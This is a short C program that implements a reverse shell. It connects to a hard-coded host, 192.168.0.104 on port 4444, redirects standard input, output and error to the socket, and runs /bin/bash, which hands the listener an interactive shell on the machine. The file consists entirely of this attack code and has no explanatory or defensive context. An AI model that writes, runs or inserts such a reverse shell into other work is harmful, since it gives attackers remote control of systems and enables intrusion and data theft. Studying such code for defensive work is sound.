#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char *argv[])
{
    int sockfd;
    struct sockaddr_in dest;

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // Set the destination address
    memset(&dest, 0, sizeof(dest));
    dest.sin_family = AF_INET;
    dest.sin_addr.s_addr = inet_addr("192.168.0.104");
    dest.sin_port = htons(4444);

    // Connect to the remote host
    connect(sockfd, (struct sockaddr *)&dest, sizeof(struct sockaddr));

    // Duplicate file descriptors for stdin, stdout, and stderr
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    // Execute a shell
    execve("/bin/bash", NULL, NULL);

    return 0;
}
